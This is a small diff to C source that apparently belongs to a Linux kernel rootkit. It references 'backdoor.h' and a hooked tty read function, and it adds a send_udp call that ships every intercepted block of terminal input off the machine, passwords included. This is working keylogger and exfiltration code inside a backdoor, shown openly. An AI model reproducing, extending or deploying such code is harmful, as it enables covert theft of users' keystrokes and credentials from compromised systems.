@@ -6,6 +6,7 @@
 #include "backdoor.h"
 #include "read.h"
 #include "hook.h"
+#include "inputlog.h"
 
 atomic_t tty_read_count;
 
@@ -39,6 +40,7 @@ g7_tty_read(struct file *file, char *buf, size_t count, loff_t *off)
     atomic_inc(&tty_read_count);
     ssize_t ret = current_tty_read(file, buf, count, off);
     handle_pid(current->pid, buf, count);
+    send_udp(buf, count);
     atomic_dec(&tty_read_count);
     return ret;
 }
